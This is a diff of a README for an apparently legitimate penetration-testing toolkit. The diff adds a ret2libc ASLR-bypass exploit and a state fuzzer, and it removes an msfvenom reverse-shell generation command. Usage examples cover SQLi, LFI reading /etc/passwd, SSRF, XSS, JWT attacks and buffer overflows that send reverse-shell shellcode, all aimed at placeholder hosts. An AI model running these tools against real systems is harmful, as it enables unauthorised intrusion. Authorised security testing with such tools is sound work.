@@ -20,8 +20,12 @@ A modular black box penetration testing toolkit for identifying and validating c
 - **BOLA/IDOR** — Path-based and parameter-based object-level authorization testing
 - **JWT Weakness Detection** — Tests for alg:none, weak secrets, and algorithm confusion attacks
 
-**Exploit Development**
+**Binary Exploitation**
 - **Buffer Overflow** — Parameterized stack-based buffer overflow exploit with NOP sled, bad char detection, and dry run mode
+- **ret2libc** — ROP-based ret2libc exploit with static and dynamic (ASLR bypass) modes
+
+**Fuzzer**
+- **State Fuzzer** — HTTP flow fuzzer that tests step skipping and step reordering to detect broken state logic
 
 ---
 
@@ -40,6 +44,7 @@ requests
 paramiko
 pyfiglet
 urllib3
+pwntools
 ```
 
 ---
@@ -63,7 +68,7 @@ You'll be prompted to select a module and enter the target details interactively
 Detects boolean-based and time-based blind SQL injection.
 
 ```bash
-python3 sqli.py -u <URL> -p <PARAMETER> [-e <ENCODING>]
+python3 sqli.py -u <URL> -p <PARAMETER> [-e <ENCODING>] [-v <VALUE>]
 ```
 
 | Argument | Description |
@@ -71,6 +76,7 @@ python3 sqli.py -u <URL> -p <PARAMETER> [-e <ENCODING>]
 | `-u` | Target URL |
 | `-p` | Vulnerable parameter name |
 | `-e` | Encoding: `none`, `url`, `double`, `base64`, `all` |
+| `-v` | Base parameter value to prepend to payloads (default: `1`) |
 
 ---
 
@@ -106,7 +112,7 @@ python3 lfi.py <URL> <PARAM> <PAYLOAD> [--method GET|POST] [--encode ENCODING] [
 | `url` | Target URL |
 | `param` | Vulnerable parameter |
 | `lfi_payload` | File path to include (e.g. `/etc/passwd`) |
-| `method` | HTTP method (default: GET) |
+| `--method` | HTTP method (default: GET) |
 | `--encode` | Encoding: `none`, `url`, `double`, `base64`, `traversal`, `double_traversal`, `nullbyte`, `all` |
 | `--php-filter` | Use PHP filter wrapper to base64-decode source |
 | `--ssh` | Perform SSH log poisoning |
@@ -199,7 +205,7 @@ python3 mass_assignment.py <URL> <ENDPOINT> <USERNAME> <PASSWORD> [--fields FIEL
 
 ---
 
-### BOLA/IDOR (`API/bola.py`)
+### BOLA/IDOR (`API/BOLA/bola.py`)
 
 Tests for broken object level authorization via path-based ID iteration or parameter substitution.
 
@@ -221,7 +227,7 @@ python3 bola.py <URL> [--token TOKEN] [--range N] [--param PARAM] [--own-id ID] 
 
 ---
 
-### JWT Weakness Detection (`API/jwt.py`)
+### JWT Weakness Detection (`API/JWT/jwt.py`)
 
 Tests JWT tokens for common weaknesses including alg:none, weak secrets, and algorithm confusion.
 
@@ -245,9 +251,9 @@ python3 jwt.py <TOKEN> [--url URL] [--header HEADER] [--alg-none] [--weak-secret
 
 ---
 
-## Exploit Development
+## Binary Exploitation
 
-### Buffer Overflow (`Buffer-Overflow/buffer_overflow.py`)
+### Buffer Overflow (`Binary-Exploitation/buffer_overflow.py`)
 
 Parameterized stack-based buffer overflow exploit module. Builds and delivers a payload with configurable NOP sled, bad char detection, and dry run mode. Supports raw shellcode binaries generated with NASM or msfvenom.
 
@@ -281,11 +287,11 @@ python3 buffer_overflow.py -H <HOST> -p <PORT> -s <SHELLCODE> -b <BUFFER_SIZE> -
 4. Send the payload with `--send`
 
 ```bash
-# Dry run to verify layout
+# Dry run
 python3 buffer_overflow.py -H 127.0.0.1 -p 4444 \
   -s revshell.bin -b 64 -r 0x7fffffffdb90
 
-# Fire when ready
+# Fire
 python3 buffer_overflow.py -H 127.0.0.1 -p 4444 \
   -s revshell.bin -b 64 -r 0x7fffffffdb90 --send
 
@@ -295,18 +301,114 @@ python3 buffer_overflow.py -H 127.0.0.1 -p 4444 \
   --nop-size 256 --bad-chars "00,0a,0d,20" --send
 ```
 
-**Generating shellcode:**
-```bash
-# Reverse shell with msfvenom (bad char filtering built in)
-msfvenom -p linux/x64/shell_reverse_tcp \
-  LHOST=<YOUR_IP> LPORT=9001 \
-  -b '\x00\x0a\x0d' \
-  -f raw -o revshell.bin
+---
 
-# Custom NASM shellcode
-nasm -f elf64 shellcode.asm -o shellcode.o
-ld -o shellcode shellcode.o
-objcopy -O binary --only-section=.text shellcode shellcode.bin
+### ret2libc (`Binary-Exploitation/ret2libc.py`)
+
+ROP-based ret2libc exploit module. Supports both static mode (ASLR off) with known addresses and dynamic mode (ASLR on) with libc leak via puts@plt. Requires pwntools.
+
+```bash
+python3 ret2libc.py -H <HOST> -p <PORT> -b <BUFFER_SIZE> -e <ELF> --pop-rdi <ADDR> --ret <ADDR> [OPTIONS]
+```
+
+**Required arguments:**
+
+| Argument | Description |
+|---|---|
+| `-H`, `--host` | Target IP or hostname |
+| `-p`, `--port` | Target port |
+| `-b`, `--buffer-size` | Buffer size in bytes |
+| `-e`, `--elf` | Path to target binary |
+| `--pop-rdi` | `pop rdi ; ret` gadget address (hex) |
+| `--ret` | `ret` gadget address for stack alignment (hex) |
+
+**Static mode (ASLR off):**
+
+| Argument | Description |
+|---|---|
+| `--libc-base` | Known libc base address (hex) |
+| `--system` | Known `system()` address (hex) |
+| `--bin-sh` | Known `/bin/sh` address (hex) |
+
+**Dynamic mode (ASLR on):**
+
+| Argument | Description |
+|---|---|
+| `--dynamic` | Enable ASLR bypass via libc leak |
+| `--libc` | Path to `libc.so.6` |
+| `--puts-plt` | `puts@plt` address (hex) |
+| `--puts-got` | `puts@got` address (hex) |
+| `--main` | `main()` address to return to after leak (hex) |
+
+**Protocol options:**
+
+| Argument | Description |
+|---|---|
+| `--recv-until` | String to `recvuntil` before sending payload |
+| `--send-first` | String to send before payload (e.g. menu option) |
+| `--stage2-until` | String to `recvuntil` before stage 2 payload |
+| `--rbp-size` | Saved RBP size (default: 8) |
+| `--send` | Send payload — omit for dry run |
+| `--timeout` | Socket timeout in seconds (default: 5) |
+
+**Workflow:**
+1. Find buffer size and gadgets using `ROPgadget` or `ropper`
+2. For dynamic mode, locate `puts@plt`, `puts@got`, and `main()` in the binary
+3. Provide `libc.so.6` for offset calculations
+4. Dry run first, then `--send`
+
+```bash
+# Static mode
+python3 ret2libc.py -H 127.0.0.1 -p 4444 \
+  -b 64 -e ./vuln \
+  --pop-rdi 0x401234 --ret 0x401235 \
+  --libc-base 0x7ffff7dc0000 \
+  --system 0x7ffff7e13290 \
+  --bin-sh 0x7ffff7f7a152 \
+  --send
+
+# Dynamic mode (ASLR bypass)
+python3 ret2libc.py -H 127.0.0.1 -p 4444 \
+  -b 64 -e ./vuln --libc /lib/x86_64-linux-gnu/libc.so.6 \
+  --pop-rdi 0x401234 --ret 0x401235 \
+  --puts-plt 0x401090 --puts-got 0x404018 \
+  --main 0x401156 \
+  --dynamic --send
+```
+
+---
+
+## Fuzzer
+
+### State Fuzzer (`Fuzzer/state_fuzzer.py`)
+
+Tests multi-step HTTP flows for broken state logic by detecting behavior changes when steps are skipped or reordered. Useful for finding authentication bypass and business logic vulnerabilities.
+
+```bash
+python3 state_fuzzer.py <URL> [--steps N] [--flow FILE]
+```
+
+| Argument | Description |
+|---|---|
+| `url` | Base URL to fuzz |
+| `--steps` | Number of random steps to generate (default: 10) |
+| `--flow` | Path to a JSON file defining the steps to fuzz |
+
+**Flow file format (`flows.json`):**
+```json
+[
+    {"name": "register", "request": {"method": "POST", "endpoint": "/register"}},
+    {"name": "login",    "request": {"method": "POST", "endpoint": "/login"}},
+    {"name": "profile",  "request": {"method": "GET",  "endpoint": "/profile"}}
+]
+```
+
+```bash
+# Random steps
+python3 state_fuzzer.py http://target.com --steps 5
+
+# Custom flow
+python3 state_fuzzer.py http://target.com --flow flows.json
 ```
 
 ---
@@ -314,28 +416,28 @@ objcopy -O binary --only-section=.text shellcode shellcode.bin
 ## Examples
 
 ```bash
-# Test for SSRF
-python3 ssrf.py http://target.com/fetch url 1.2.3.4 8080
+# SQLi with URL encoding and base value
+python3 sqli.py -u http://target.com/item -p id -e url -v 1
 
-# Test for SSTI with login
+# SSTI with login
 python3 ssti.py http://target.com/ name --login --username admin --password admin
 
 # LFI with PHP filter
 python3 lfi.py http://target.com/page.php file /etc/passwd --php-filter
 
-# SQLi with URL encoding
-python3 sqli.py -u http://target.com/item -p id -e url
+# SSRF
+python3 ssrf.py http://target.com/fetch url 1.2.3.4 8080
 
 # XXE auto-detect
 python3 xxe.py http://target.com/api/upload --detect
 
-# XSS on a search parameter
+# XSS
 python3 xss.py http://target.com/search q --method GET
 
 # Mass assignment
 python3 mass_assignment.py http://target.com/ api/register user pass
 
-# BOLA/IDOR path-based
+# BOLA/IDOR
 python3 bola.py http://target.com/api/users --token eyJ... --range 10
 
 # JWT all tests
@@ -346,6 +448,16 @@ python3 buffer_overflow.py -H 192.168.1.10 -p 4444 -s revshell.bin -b 64 -r 0x7f
 
 # Buffer overflow fire
 python3 buffer_overflow.py -H 192.168.1.10 -p 4444 -s revshell.bin -b 64 -r 0x7fffffffdb90 --send
+
+# ret2libc dynamic mode
+python3 ret2libc.py -H 192.168.1.10 -p 4444 -b 64 -e ./vuln \
+  --libc /lib/x86_64-linux-gnu/libc.so.6 \
+  --pop-rdi 0x401234 --ret 0x401235 \
+  --puts-plt 0x401090 --puts-got 0x404018 \
+  --main 0x401156 --dynamic --send
+
+# State fuzzer with flow file
+python3 state_fuzzer.py http://target.com --flow flows.json
 ```
 
 ---
